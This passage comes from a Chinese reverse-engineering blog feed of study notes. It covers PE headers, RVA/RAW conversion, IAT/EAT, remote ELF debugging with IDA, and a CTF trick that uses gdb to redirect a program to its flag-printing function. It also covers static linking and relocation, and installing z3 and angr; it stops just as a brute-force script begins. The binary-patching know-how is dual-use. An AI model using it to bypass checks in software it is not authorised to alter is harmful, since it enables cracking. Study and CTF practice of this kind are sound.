title="NT文件头"></a>NT文件头</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></div><div class="line">    WORD    Machine;　　　　　　　　　<span class="comment">//机器型号,哪个CPU可以跑的.重要.</span></div><div class="line">    WORD    NumberOfSections;　　　　  <span class="comment">//节的数量 .data , .text </span></div><div class="line">    DWORD   TimeDateStamp;　　　　　　　<span class="comment">//程序的编译时间,参考用,没有实际作用</span></div><div class="line">    DWORD   PointerToSymbolTable;　　　<span class="comment">//符号表地址，主要是给比人用的</span></div><div class="line">    DWORD   NumberOfSymbols;　　　　　　　<span class="comment">//符号表大小</span></div><div class="line">    WORD    SizeOfOptionalHeader;　　　<span class="comment">//可选头大小,这个字段很重要.才知道可选头是多大</span></div><div class="line">    WORD    Characteristics;　　　　　　<span class="comment">//文件属性,描述文件信息的.</span></div><div class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</div></pre></td></tr></table></figure><h2 id="NT可选头结构体"><a href="#NT可选头结构体" class="headerlink" title="NT可选头结构体"></a>NT可选头结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>  </span></div><div class="line"><span class="class">&#123;</span>  </div><div class="line">        <span class="comment">//   </span></div><div class="line">        <span class="comment">// Standard fields.     </span></div><div class="line">        <span class="comment">//   </span></div><div class="line">        WORD    Magic;              <span class="comment">// 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）   </span></div><div class="line">        BYTE    MajorLinkerVersion;     <span class="comment">// 链接程序的主版本号   </span></div><div class="line">        BYTE    MinorLinkerVersion;     <span class="comment">// 链接程序的次版本号   </span></div><div class="line">        DWORD   SizeOfCode;         <span class="comment">// 所有含代码的节的总大小   </span></div><div class="line">        DWORD   SizeOfInitializedData;          <span class="comment">// 所有含已初始化数据的节的总大小   </span></div><div class="line">        DWORD   SizeOfUninitializedData;        <span class="comment">// 所有含未初始化数据的节的大小   </span></div><div class="line">        DWORD   AddressOfEntryPoint;        <span class="comment">// 程序执行入口RVA   </span></div><div class="line">        DWORD   BaseOfCode;         <span class="comment">// 代码的区块的起始RVA   </span></div><div class="line">        DWORD   BaseOfData;         <span class="comment">// 数据的区块的起始RVA    </span></div><div class="line">        DWORD   ImageBase;          <span class="comment">// 程序的首选装载地址   </span></div><div class="line">        DWORD   SectionAlignment;       <span class="comment">// 内存中的区块的对齐大小   </span></div><div class="line">        DWORD   FileAlignment;          <span class="comment">// 文件中的区块的对齐大小   </span></div><div class="line">        WORD    MajorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的主版本号   </span></div><div class="line">        WORD    MinorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的副版本号   </span></div><div class="line">        WORD    MajorImageVersion;      <span class="comment">// 可运行于操作系统的主版本号   </span></div><div class="line">        WORD    MinorImageVersion;      <span class="comment">// 可运行于操作系统的次版本号   </span></div><div class="line">        WORD    MajorSubsystemVersion;      <span class="comment">// 要求最低子系统版本的主版本号   </span></div><div class="line">        WORD    MinorSubsystemVersion;      <span class="comment">// 要求最低子系统版本的次版本号   </span></div><div class="line">        DWORD   Win32VersionValue;      <span class="comment">// 莫须有字段，不被病毒利用的话一般为0   </span></div><div class="line">        DWORD   SizeOfImage;            <span class="comment">// 映像装入内存后的总尺寸   </span></div><div class="line">        DWORD   SizeOfHeaders;          <span class="comment">// 所有头+ 区块表的尺寸大小   </span></div><div class="line">        DWORD   CheckSum;           <span class="comment">// 映像的校检和   </span></div><div class="line">        WORD    Subsystem;          <span class="comment">// 可执行文件期望的子系统   </span></div><div class="line">        WORD    DllCharacteristics;     <span class="comment">// DllMain()函数何时被调用，默认为0   </span></div><div class="line">        DWORD   SizeOfStackReserve;     <span class="comment">// 初始化时的栈大小   </span></div><div class="line">        DWORD   SizeOfStackCommit;      <span class="comment">// 初始化时实际提交的栈大小   </span></div><div class="line">        DWORD   SizeOfHeapReserve;      <span class="comment">// 初始化时保留的堆大小   </span></div><div class="line">        DWORD   SizeOfHeapCommit;       <span class="comment">// 初始化时实际提交的堆大小   </span></div><div class="line">        DWORD   LoaderFlags;            <span class="comment">// 与调试有关，默认为0    </span></div><div class="line">        DWORD   NumberOfRvaAndSizes;    <span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16   </span></div><div class="line">        IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  </div><div class="line">        <span class="comment">// 数据目录表   </span></div><div class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</div></pre></td></tr></table></figure><h2 id="一共31个字段成员-6个重要的"><a href="#一共31个字段成员-6个重要的" class="headerlink" title="一共31个字段成员,6个重要的"></a>一共31个字段成员,6个重要的</h2><p>RVA也叫作OEP<br>AddressOfEntryPoint 持有EP 的RVA 值<br>基址<br>SizeOfHeader PE 头的大小<br>Subsystem 用来区分系统驱动文件与普通可执行文件。<br>DataDirectory数组</p><h2 id="重点是最后一个成员IMAGE-DATA-DIRECTORY-DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES"><a href="#重点是最后一个成员IMAGE-DATA-DIRECTORY-DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES" class="headerlink" title="重点是最后一个成员IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];"></a>重点是最后一个成员IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</h2><p>因为DataDirectory数组里保存了导入表（用了哪些dll），导出表，TLS（Thread Local Storage） Directory等RVA和大小的信息<br>倒数第二个变量决定NumberOfRvaAndSizes数组长度<br>在LoadPE工具中，文件头显示信息，如下：<br><img src="https://i.imgur.com/lhhFCrk.png" alt=""></p><h2 id="DataDirectory数组"><a href="#DataDirectory数组" class="headerlink" title="DataDirectory数组"></a>DataDirectory数组</h2><p>IMAGE_DATA_DIRCTORY结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span>  </div><div class="line">        DWORD　VirtualAddress; <span class="comment">//相对虚拟地址  </span></div><div class="line">        DWORD　Size;　　　　　 <span class="comment">//大小  </span></div><div class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</div></pre></td></tr></table></figure></p><p>一个是RVA，一个是大小</p><p>data directory数据目录在WINNT.H中定义为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT         0 导出表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT         1 导入表   </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE       2 资源目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION      3 异常目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY       4 安全目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC      5 重定位基本表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG          6 调试目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7 描术字串  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8 机器值  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS            9 TLS目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10 载入配值目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11 绑定输入表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12 导入地址表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 COM信息</span></div></pre></td></tr></table></figure></p><p>在LoadPE工具中，数据目录显示信息，如下：<br><img src="https://i.imgur.com/7yB4x1A.png" alt=""></p><h1 id="4、RVA和RAW"><a href="#4、RVA和RAW" class="headerlink" title="4、RVA和RAW"></a>4、RVA和RAW</h1><p>理解PE 最重要的一个部分就是理解文件从磁盘到内存地址的映射过程，做逆向的人员，只有熟练地掌握才能跟踪到程序的调用过程和位置，才能分析和寻找漏洞。<br>对于文件和内存的映射关系，其实很简单，他们通过一个简单的公式计算而来：<br><img src="https://i.imgur.com/U9LeUOb.jpg" alt=""><br>换算公式是这样的：<br>RAW - PointToRawData(磁盘文件中节区起始位置) = RVA(相对虚拟地址) - VirtualAddress</p><p>寻找过程就是先找到RVA 所在的段，然后根据公式计算出文件偏移。因为我们通过逆向工具，可以在内存中查找到所在的RVA，进而我们就可以计算出在文件中所在的位置，这样，就可以手动进行修改。</p><p>VA与RVA公式是这样的：</p><h2 id="RVA-VA（虚拟地址）-ImageBase（基址）"><a href="#RVA-VA（虚拟地址）-ImageBase（基址）" class="headerlink" title="RVA = VA（虚拟地址） - ImageBase（基址）"></a>RVA = VA（虚拟地址） - ImageBase（基址）</h2><p>结果:</p><h2 id="RAW-VA-ImageBase-VirtualAddress-PointerToRawData"><a href="#RAW-VA-ImageBase-VirtualAddress-PointerToRawData" class="headerlink" title="RAW = VA - ImageBase - VirtualAddress + PointerToRawData"></a>RAW = VA - ImageBase - VirtualAddress + PointerToRawData</h2><p>比如:<br>VA=0x003A20F4 , ImageBase =0x003A0000<br><img src="https://i.imgur.com/SwaxF8w.png" alt=""><br>可以看到0x20F4地址位于VirtualAddress 为0x2000的.rdata节，偏移为0x20F4 - 0x2000 = 0xF4<br>观察节表，.rdata的PointerToRawData为0xE00，字符串在磁盘中的地址为0xE00 + 0xF4 = 0xEF4<br>使用公式：<br>RAW = VA - ImageBase - VirtualAddress + PointerToRawData = 0x003A20F4 - 0x003A0000 - 0x2000 + 0xE00 = 0xEF4<br>用winhex打开二进制文件<br><img src="https://i.imgur.com/EQhlnD9.png" alt=""></p><h1 id="5、IAT与EAT"><a href="#5、IAT与EAT" class="headerlink" title="5、IAT与EAT"></a>5、IAT与EAT</h1><h2 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h2><p>一个普通PE文件的运行往往需要导入多个库文件，在PE文件运行时如何找到库文件中函数的准确入口是程序正确运行的保证。IAT就是提供这样保证的一个机制。IAT总得来说是一张表，表内存储着每个库文件函数在内存中的地址。<br>结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        DWORD   Characteristics;            <span class="comment">//导入表结束标志</span></div><div class="line">        DWORD   OriginalFirstThunk;         <span class="comment">//RVA指向一个结构体数组(INT表)</span></div><div class="line">    &#125;;</div><div class="line">    DWORD   TimeDateStamp;                  <span class="comment">//时间戳</span></div><div class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></div><div class="line">    DWORD   Name;                           <span class="comment">//RVA指向dll名字，以0结尾</span></div><div class="line">    DWORD   FirstThunk;                     <span class="comment">//RVA指向一个结构体数组(IAT表)</span></div><div class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</div></pre></td></tr></table></figure></p><p>第一个成员是一个联合体：一般给出的是OriginalFirstThunk的值，这个值是INT的地址，INT（Import Name Table）是一个存储了库文件函数名称的表<br>第二个成员是时间戳<br>第三个成员是ForwarderChain<br>第四个成员是Name，存储的是库名称字符数组的地址<br>第五个成员是FirstThunk，存储的是IAT表的地址</p><p>第一步：<br>PE加载器读取结构体成员的值，Name成员找到库名称，然后将库文件加载到内存中来。<br>第二步：<br>PE加载器读取OriginalFirstThunk值获得INT地址，然后依次读取INT各项的值，根据函数的标号获取函数的地址<br>第三步：<br>根据FirstThunk的值获取IAT的地址，将上一步获得地址送入IAT中存储。</p><p>理解:读取IID(结构体)成员name获取库名-&gt;load(库)-&gt;读取IID的成员，获取INT的地址-&gt;读取函数名并获取地址-&gt;读取IID的成员，获取IAT的地址-&gt;将得到函数地址存入IAT中-&gt;重复直到INT为NULL</p><h2 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h2><p>EAT对应的结构体为IMAGE_EXPORT_DESCRIPTOR，位置信息存储在可选头DataDirectory[0]中。<br>一般PE文件此项值应为0，代表不存在这个表项，只有库文件，才会含有这个表项。<br>结构体成员包括特征值，时间戳，版本信息等。重要的成员是Name，存储着库文件的名字；Base存储着函数标号从哪里开始；NumberOfFunctions存储着函数的数量；NumberOfNames存储着函数名称的数量（一般情况下这两项相同）；AddressOfFunctions函数地址数组的首地址；AddressOfNames函数名称地址数组的首地址；AdressOfNameOrdinals，存储着函数标号的地址信息。</p><p>个人思考:记得以前学习的时候，把VA与VirtualAddress看成一个相同的，导致转化的时候很矛盾，现在再看，真是自己可以静心好好的学，再次理解IAT的运行机制。</p><p>参考：<br><a href="https://www.jianshu.com/p/af9766222816" target="_blank" rel="external">https://www.jianshu.com/p/af9766222816</a><br><a href="https://www.cnblogs.com/aguoshaofang/p/5021759.html" target="_blank" rel="external">https://www.cnblogs.com/aguoshaofang/p/5021759.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习可执行文件的文件结构——PE。PE文件是微软Windows操作系统上的程序文件，意为可移植的可执行的文件。PE的段头直接沿用的COFF 的段头结构。&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_Windows下IDA动态调试linux的ELF</title>
    <link href="http://yoursite.com/2018/03/09/re_3_elf_debugging/"/>
    <id>http://yoursite.com/2018/03/09/re_3_elf_debugging/</id>
    <published>2018-03-09T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:19.140Z</updated>
    
    <content type="html"><![CDATA[<p>IDA真的好用<br><a id="more"></a></p><h1 id="IDA动态调试linux的ELF"><a href="#IDA动态调试linux的ELF" class="headerlink" title="IDA动态调试linux的ELF"></a>IDA动态调试linux的ELF</h1><h2 id="1、准备"><a href="#1、准备" class="headerlink" title="1、准备"></a>1、准备</h2><p>在 IDA 的安装目录/dbgsrc/找到 linux_server 和 linux_serverx64 拷贝到 linux 虚拟机中</p><h2 id="2、查看文件类型"><a href="#2、查看文件类型" class="headerlink" title="2、查看文件类型"></a>2、查看文件类型</h2><p><code>file elf</code><br>如果是32位的运行<br><code>./linux_server</code><br>64位的运行<br><code>./linux_serverx64</code></p><h2 id="3、Windows设置"><a href="#3、Windows设置" class="headerlink" title="3、Windows设置"></a>3、Windows设置</h2><p>1、Debugger –&gt;Remote Linux debugger<br>2、Debugger –&gt;Process options –&gt; hostname<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjr8txdky9j30fh08t74d.jpg" alt=""></p><h2 id="4、运行"><a href="#4、运行" class="headerlink" title="4、运行"></a>4、运行</h2><h1 id="Linux下修改程序流程"><a href="#Linux下修改程序流程" class="headerlink" title="Linux下修改程序流程"></a>Linux下修改程序流程</h1><h2 id="1、Linux下修改程序流程"><a href="#1、Linux下修改程序流程" class="headerlink" title="1、Linux下修改程序流程"></a>1、Linux下修改程序流程</h2><p>今天看见一个ctf的elf题目，很有趣，是一个dice题目，很熟悉嘛。今天有发现一种新套路，便记录下来，以后遇见就嘿嘿嘿</p><h2 id="2、分析"><a href="#2、分析" class="headerlink" title="2、分析"></a>2、分析</h2><p>打开ida，发现如下<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fjsow111ogj30f30ap74d.jpg" alt=""><br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjsoxdbsenj30ho08ddft.jpg" alt=""><br>前面生成随机数，后面验证，以往我都会改验证的地方，今天来点不一样的</p><h2 id="3、修改"><a href="#3、修改" class="headerlink" title="3、修改"></a>3、修改</h2><p>发现flag在这个函数打印<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjsp2mc1g3j30f503idfo.jpg" alt=""><br>这个函数的地址是0x4006B6,同时发现main开始运行的 地址<br><img src="http://ww4.sinaimg.cn/large/006rgqhqgy1fjsp7bf6c8j30hf043q2u.jpg" alt=""><br>linux下gdb调试，在下断点,run运行<br><img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fjsp9inf3vj30a40983zg.jpg" alt=""><br>i r 查看寄存器的值,此时，还没有运行到程序区<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjspcf2jrdj30f106saad.jpg" alt=""><br>n下一步，在i r查看<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjspf4abj5j30dr059t8t.jpg" alt=""><br>发现已经到达程序区了，将rdi寄存器设置为我们想要的值 set $rdi=0x4006b6,运行c<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjspjccvgqj30ef046t8x.jpg" alt=""></p><h1 id="程序员自我修养第4章——静态编译"><a href="#程序员自我修养第4章——静态编译" class="headerlink" title="程序员自我修养第4章——静态编译"></a>程序员自我修养第4章——静态编译</h1><h2 id="1、什么是静态编译"><a href="#1、什么是静态编译" class="headerlink" title="1、什么是静态编译"></a>1、什么是静态编译</h2><p>静态编译，就是编译器在编译可执行文件的时候，将可执行文件需要调用的对应动态链接库(.so或.lib)中的部分提取出来，链接到可执行文件中去，使可执行文件在运行的时候不依赖于动态链接库。</p><h2 id="2、实验"><a href="#2、实验" class="headerlink" title="2、实验"></a>2、实验</h2><p>这里有a.c,b.c两个文件，如下:<br>b.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> shared=<span class="number">1</span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">*a^=*b^=*a^=*b;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>a.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">extern</span> <span class="keyword">int</span> shared;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> a=<span class="number">100</span>;</div><div class="line">swap(&amp;a,&amp;shared);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>通过编译<code>gcc -c a.c b.c</code>产生a.o,b.o两个目标文件，接着我们准备把a.o,b.o文件合并ab文件。这里有两种方法。</p><h2 id="一种是按序叠加-直接将一个文件加在另一个文件的尾，并依此合并-。"><a href="#一种是按序叠加-直接将一个文件加在另一个文件的尾，并依此合并-。" class="headerlink" title="一种是按序叠加(直接将一个文件加在另一个文件的尾，并依此合并)。"></a>一种是<code>按序叠加</code>(直接将一个文件加在另一个文件的尾，并依此合并)。</h2><h2 id="一种是相似段合并-将相同性质的段合并到一起，如text段合并到text段-，又称为两步链接法。"><a href="#一种是相似段合并-将相同性质的段合并到一起，如text段合并到text段-，又称为两步链接法。" class="headerlink" title="一种是相似段合并(将相同性质的段合并到一起，如text段合并到text段)，又称为两步链接法。"></a>一种是<code>相似段合并</code>(将相同性质的段合并到一起，如text段合并到text段)，又称为<code>两步链接法</code>。</h2><p>这里我们采用第二种方法进行链接(链接器为目标文件分配地址和空间)</p><h3 id="第一步-空间与地址分配"><a href="#第一步-空间与地址分配" class="headerlink" title="第一步 空间与地址分配"></a>第一步 空间与地址分配</h3><p>扫描所有的输入文件，获取他们的各个段的长度，属性和位置，并且将输入目标文件的符号表中所有的符号定义和符号引用收集起来，同意放到一个全局符号表，并建立映射关系。</p><h3 id="第二步-符号解析与重定位"><a href="#第二步-符号解析与重定位" class="headerlink" title="第二步 符号解析与重定位"></a>第二步 符号解析与重定位</h3><p>使用上面收集的所有信息，读取输入文件中断的数据，重定位信息，并且进行符号解析与重定位，调整代码中的地址等。这一步中核心是重定位过程。<br>我们使用ld链接器将<code>a.o</code>和<code>b.o</code>链接起来。<br><code>ld a.o b.o -e main -o ab</code><br>-e main 表示将main函数作为程序的入口地址，ld链接器默认的程序入口地址是_start.<br>-o ab 表示链接输出文件名为ab，默认为a.out<br><img src="https://i.imgur.com/CcjDrqB.png" alt=""><br><img src="https://i.imgur.com/VBcjd4b.png" alt=""><br>上图中VMA(Vitual Meemory Address)虚拟地址，LMA(load Memory Address)加载地址，正常情况下这两个是一样的，但是在一些嵌入式系统中，特别是在哪些程序放在ROM的系统中，它们是不同的。</p><h3 id="符号地址的确定"><a href="#符号地址的确定" class="headerlink" title="符号地址的确定"></a>符号地址的确定</h3><p>当完成前面一步时，链接器开始计算各个符号的虚拟地址，因为各个符号在段内的相对位置是固定的，所有这个时候<code>main</code>,<code>shared</code>的地址已经确认啦(只需要每一个符号加上一个偏移，就能找到正确的虚拟地址)。</p><h3 id="符号解析和重定位"><a href="#符号解析和重定位" class="headerlink" title="符号解析和重定位"></a>符号解析和重定位</h3><h4 id="重定位"><a href="#重定位" class="headerlink" title="重定位"></a>重定位</h4><p>我们用<code>objdump -d a.o</code><br><img src="https://i.imgur.com/b7qqXAH.png" alt=""><br>可以看到shared的地址是0，因为这里不知道的位置。swap也是一样的。我们再看看ab<br><code>objdunp -d ab</code><br><img src="https://i.imgur.com/gIQHS6j.png" alt=""><br>发现链接后能正确的找到符号地址</p><h4 id="重定位修正方法"><a href="#重定位修正方法" class="headerlink" title="重定位修正方法"></a>重定位修正方法</h4><p>对于Intel x86处理器，有两种类型的处理器，分布的修正方法<br>A = 保存在修正位置的值<br>S = 符号的实际地址<br>P = 被修正过的位置(相对于段开始的偏移量或是虚拟地址)</p><p>1、R_386_32 绝对寻址修正 S+A<br>2、R_386_PC32 相对寻址修正 S+A-P</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IDA真的好用&lt;br&gt;
    
    </summary>
    
      <category term="re" scheme="http://yoursite.com/categories/re/"/>
    
    
  </entry>
  
  <entry>
    <title>Re_Windows爆破exe程序</title>
    <link href="http://yoursite.com/2018/03/04/re_2_bp_exe/"/>
    <id>http://yoursite.com/2018/03/04/re_2_bp_exe/</id>
    <published>2018-03-04T00:49:18.000Z</published>
    <updated>2018-05-15T00:34:15.296Z</updated>
    
    <content type="html"><![CDATA[<p>爆破最好的解决方法，z3 求解器是什么？<br><a id="more"></a></p><h1 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h1><h2 id="z3的安装"><a href="#z3的安装" class="headerlink" title="z3的安装"></a>z3的安装</h2><p>不过的我是在虚拟机上安装虚拟环境的：那z3是angr下的一个模板，那就先安装angr,就可以用z3了。<br>1、安装虚拟环境,在一个目录下配置虚拟环境<br><code>pip install virtualenvwrapper</code><br>2、配置虚拟环境<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir $HOME/.ven                    #创建工作目录</div><div class="line">vim $HOME/.bashrc                   #编辑启动项</div><div class="line">    <span class="keyword">export</span> WORKON_HOME=$HOME/.ven       #将这两项添加到文件，开机自动运行</div><div class="line">    source /usr/share/virtualenvwrapper/virtualenvwrapper.sh  #这个不同的机器可能位置不同 find / -name virtualenvwrapper.sh 找到</div></pre></td></tr></table></figure></p><p>或者直接运行<br><code>export WORKON_HOME=$HOME/.ven</code><br><code>source /usr/share/virtualenvwrapper/virtualenvwrapper.sh</code></p><p>3、查看虚拟环境<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkvirtualenv env1                   #创建环境</div><div class="line">workon                              #列出已有环境</div><div class="line">deactivate                          #退出环境</div><div class="line">rmvirtualenv                        #删除环境</div></pre></td></tr></table></figure></p><p>4、安装angr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mkvirtualenv angr</div><div class="line">pip install angr</div></pre></td></tr></table></figure></p><h2 id="z3求解器是什么？"><a href="#z3求解器是什么？" class="headerlink" title="z3求解器是什么？"></a>z3求解器是什么？</h2><p>z3是由微软公司开发的一个优秀的SMT求解器（也就定理证明器），它能够检查逻辑表达式的可满足性<br>通俗讲，就是解方程。比如使用z3解二元一次方程：利用z3约束求解<br>x-y == 3<br>3x-8y == 4<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from z3 <span class="keyword">import</span> *</div><div class="line">x = Int(<span class="string">'x'</span>)</div><div class="line">y = Int(<span class="string">'y'</span>)</div><div class="line">solver = Solver()</div><div class="line">solver.add(x-y == <span class="number">3</span>)</div><div class="line">solver.add(<span class="number">3</span>*x<span class="number">-8</span>*y == <span class="number">4</span>)</div><div class="line"><span class="keyword">if</span> solver.check() == sat:</div><div class="line">    print solver.model()</div></pre></td></tr></table></figure></p><h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><p>它是一个易用的二进制分析套件，可以用于做动态符号执行和多种静态分析，现在来简单记录一下它的用法。详细的文档可以看这里。符号执行 （Symbolic Execution）是一种程序分析技术。其可以通过分析程序来得到让特定代码区域执行的输入。使用符号执行分析一个程序时，该程序会使用符号值作为输入，而非一般执行程序时使用的具体值。在达到目标代码时，分析器可以得到相应的路径约束，然后通过约束求解器来得到可以触发目标代码的具体值。[1]符号模拟技术（symbolic simulation）则把类似的思想用于硬件分析。符号计算（Symbolic computation）则用于数学表达式分析。angr功能很强大，需要多多练习。</p><h1 id="windows爆破"><a href="#windows爆破" class="headerlink" title="windows爆破"></a>windows爆破</h1><h2 id="1、windows爆破exe"><a href="#1、windows爆破exe" class="headerlink" title="1、windows爆破exe"></a>1、windows爆破exe</h2><p>直接看代码，以后可能用到，就记录下来<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div 